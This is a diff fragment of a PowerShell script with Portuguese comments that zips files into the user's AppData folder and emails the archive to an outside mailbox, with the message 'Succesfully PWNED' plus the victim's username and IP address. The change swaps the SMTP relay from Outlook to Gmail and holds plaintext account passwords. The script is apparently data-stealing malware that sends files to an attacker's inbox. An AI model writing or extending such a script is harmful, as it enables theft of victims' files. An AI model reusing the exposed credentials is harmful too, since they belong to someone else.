@@ -34,13 +34,13 @@ $zipPath = Join-Path -Path $env:appdata -ChildPath $zipFileName
 Compress-Archive -Path $sourcePath -DestinationPath $zipPath -Force
 
 # Definindo as informações de autenticação para envio de e-mail
-$SMTPServer = "smtp.office365.com"
+$SMTPServer = "smtp.gmail.com"
 $SMTPPort = 587
-$SMTPUsername = "williamattiny@outlook.com"
-$SMTPPassword = "dkctcyeducrzaewc"
+$SMTPUsername = "williamattiny@gmail.com"
+$SMTPPassword = "reyt nfxw udct illy"
 
 # Criando a mensagem de e-mail
-$From = "williamattiny@outlook.com"
+$From = "williamattiny@gmail.com"
 $To = "williamattiny@outlook.com"
 $Subject = "Arquivo compactado"
 $Body = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
